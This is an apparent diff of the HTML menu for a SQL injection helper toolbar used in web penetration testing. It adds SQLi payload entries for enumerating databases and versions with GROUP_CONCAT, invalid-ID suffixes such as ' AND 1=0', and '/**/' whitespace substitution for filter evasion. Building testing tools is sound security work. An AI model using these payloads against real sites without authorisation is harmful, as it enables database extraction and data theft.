@@ -10,6 +10,12 @@
 <div class="app">
   <div class="toolbar">
 
+    <div class="selection-controls" title="Add or subtract 1 from current selected number and execute">
+      <button id="minusSelection" class="selection-btn">-</button>
+      <button id="plusSelection" class="selection-btn">+</button>
+    </div>
+
+
     <div class="menu">
       <button class="menu-btn">SQLi</button>
       <div class="dropdown">
@@ -69,9 +75,31 @@
 
         <div class="item has-sub">Databases
           <div class="submenu">
-            <div class="item payload" data-full="database()" data-replace="database()">database()</div>
-            <div class="item payload" data-full="version()" data-replace="version()">version()</div>
-            <div class="item payload" data-full="@@version" data-replace="@@version">@@version</div>
+            <div class="item has-sub">system
+              <div class="submenu">
+                <div class="item has-sub">database
+                  <div class="submenu">
+                    <div class="item payload" data-full="database()" data-replace="database()">database()</div>
+                    <div class="item payload" data-full="@@database" data-replace="@@database">@@database</div>
+                  </div>
+                </div>
+
+                <div class="item has-sub">version()
+                  <div class="submenu">
+                    <div class="item payload" data-full="version()" data-replace="version()">version()</div>
+                    <div class="item payload" data-full="@@version" data-replace="@@version">@@version</div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="item has-sub">all databases
+              <div class="submenu">
+                <div class="item action" data-action="dynamic-databases-column">databases</div>
+                <div class="item action" data-action="dynamic-concat-databases-column">concat databases</div>
+                <div class="item action" data-action="dynamic-group-concat-databases-column">group concat databases</div>
+              </div>
+            </div>
           </div>
         </div>
 
@@ -94,7 +122,7 @@
         <div class="item has-sub">Data
           <div class="submenu">
             <div class="item action" data-action="dynamic-data-column">data</div>
-            <div class="item action" data-action="dynamic-all-database-column">all database</div>
+            <div class="item action" data-action="dynamic-data-group-concat-column">GROUP_CONCAT</div>
           </div>
         </div>
 
@@ -105,12 +133,48 @@
     <div class="menu">
       <button class="menu-btn">%URL</button>
       <div class="dropdown small">
-        <div class="item tool" data-tool="urlEncode">URL Encode</div>
-        <div class="item tool" data-tool="urlDecode">URL Decode</div>
-        <div class="item tool" data-tool="b64Encode">BASE64 Encode</div>
-        <div class="item tool" data-tool="b64Decode">BASE64 Decode</div>
-        <div class="item tool" data-tool="hexEncode">HEX Encode</div>
-        <div class="item tool" data-tool="hexDecode">HEX Decode</div>
+        <div class="item has-sub">replace whitespace
+          <div class="submenu">
+            <div class="item tool" data-tool="replaceWhitespacePlus">+</div>
+            <div class="item tool" data-tool="replaceWhitespaceComment">/**/</div>
+            <div class="item tool" data-tool="clearWhitespaceReplace">clear</div>
+          </div>
+        </div>
+
+        <div class="item has-sub">invaled ID
+          <div class="submenu wide">
+            <div class="item invalid-id" data-mode="prefix" data-value="-">-</div>
+            <div class="item invalid-id" data-mode="replace" data-value="999999999">999999999</div>
+            <div class="item invalid-id" data-mode="append" data-value=" AND 1=0">AND 1=0</div>
+            <div class="item invalid-id" data-mode="replace" data-value="0">0</div>
+            <div class="item invalid-id" data-mode="append" data-value=" AND NULL IS NOT NULL">AND NULL IS NOT NULL</div>
+            <div class="item invalid-id" data-mode="append" data-value=" AND ''='x'">AND ''='x'</div>
+            <div class="item invalid-id" data-mode="append" data-value=" AND 'a' LIKE 'b'">AND 'a' LIKE 'b'</div>
+            <div class="item invalid-id" data-mode="append" data-value=" AND 1 BETWEEN 3 AND 5">AND 1 BETWEEN 3 AND 5</div>
+            <div class="item invalid-id" data-mode="append" data-value=" AND 1 IN (2,3,4)">AND 1 IN (2,3,4)</div>
+          </div>
+        </div>
+
+        <div class="item has-sub">URL
+          <div class="submenu">
+            <div class="item tool" data-tool="urlEncode">Encode</div>
+            <div class="item tool" data-tool="urlDecode">Decode</div>
+          </div>
+        </div>
+
+        <div class="item has-sub">Bse64
+          <div class="submenu">
+            <div class="item tool" data-tool="b64Encode">Encode</div>
+            <div class="item tool" data-tool="b64Decode">Decode</div>
+          </div>
+        </div>
+
+        <div class="item has-sub">HEX
+          <div class="submenu">
+            <div class="item tool" data-tool="hexEncode">Encode</div>
+            <div class="item tool" data-tool="hexDecode">Decode</div>
+          </div>
+        </div>
       </div>
     </div>
 
